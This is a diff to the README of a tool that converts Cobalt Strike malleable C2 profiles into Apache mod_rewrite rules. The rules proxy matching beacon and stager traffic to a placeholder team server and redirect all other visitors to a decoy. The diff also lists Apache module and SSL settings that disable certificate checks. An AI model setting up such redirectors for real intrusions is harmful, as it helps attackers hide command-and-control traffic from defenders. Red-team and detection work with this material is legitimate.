@@ -6,6 +6,12 @@ You will most likely want to tune and test before use, but it does help get the 
 
 This was heavily based on the work by Jeff Dimmock @bluescreenofjeff
 
+__Updates and Features__
+
+ - Uses the Profile User-Agent and Endpoint URI to create rewrite rules
+ - Support CobaltStrike 3.10 HTTP Stager
+ - Template for Scripted Web Delivery support
+
 ## Quick start
 
 The havex.profile example is included for a quick test.
@@ -17,16 +23,49 @@ The havex.profile example is included for a quick test.
 
 ## Example
 
-    python csToModrewrite.py -i havex.profile -c http://myteamserver.com -d http://google.com
+    python csToModrewrite.py -i havex.profile -c http://TEAMSERVER -d http://GOHERE
     
     RewriteEngine On
-    RewriteCond %{REQUEST_URI} ^/(/include/template/isx.php|/wp06/wp-includes/po.php|/wp08/wp-includes/dtcla.php|/modules/mod_search.php|/blog/wp-includes/pomo/src.php|/includes/phpmailer/class.pop3.php)/?$
+    
+    # Scripted Web Delivery (Optional)
+    # Uncomment and adjust as needed
+    #RewriteCond %{REQUEST_URI} ^/imgs/logo1.png?$
+    #RewriteCond %{HTTP_USER_AGENT} ^$
+    #RewriteRule ^.*$ http://TEAMSERVER%{REQUEST_URI} [P]
+    #RewriteCond %{REQUEST_URI} ^/..../?$
+    
+    # C2 Traffic (HTTP-GET, HTTP-POST, HTTP-STAGER URIs) 
+    RewriteCond %{REQUEST_URI} ^/(/include/template/isx.php|/wp06/wp-includes/po.php|/wp08/wp-includes/dtcla.php|/modules/mod_search.php|/blog/wp-includes/pomo/src.php|/includes/phpmailer/class.pop3.php|/api/516280565958|/api/516280565959)/?$
     RewriteCond %{HTTP_USER_AGENT} ^Mozilla/5\.0\ (Windows;\ U;\ MSIE\ 7\.0;\ Windows\ NT\ 5\.2)\ Java/1\.5\.0_08)?$
-    RewriteRule ^.*$ http://myteamserver.com{REQUEST_URI} [P]
-    RewriteRule ^.*$ http://google.com/? [L,R=302]
+    RewriteRule ^.*$ http://TEAMSERVER{REQUEST_URI} [P]
+    
+    # Redirect All other traffic here
+    RewriteRule ^.*$ http://GOHERE/? [L,R=302]
+
+----------------------------------------------
+## Apache Rewrite Setup and Tips
+
+__Enable Rewrite and Proxy__
+
+    a2enmod rewrite
+    a2enmod proxy
+    a2enmod proxy_http
+    service apache2 reload
+
+__SSL support requires the following in the site config__
+
+    # Enable SSL
+    SSLEngine On
+    # Enable Proxy
+    SSLProxyEngine On
+    # Trust Self-Signed Certificates generate by CobaltStrike
+    SSLProxyVerify none
+    SSLProxyCheckPeerCN off
+    SSLProxyCheckPeerName off
 
 ## References
 
-Refer to the bluescreenofjeff blog post for more details
+
+[Apache mod_rewrite](http://httpd.apache.org/docs/current/mod/mod_rewrite.html)
 
 [Cobalt Strike HTTP C2 Redirectors with Apache mod_rewrite](https://bluescreenofjeff.com/2016-06-28-cobalt-strike-http-c2-redirectors-with-apache-mod_rewrite/)
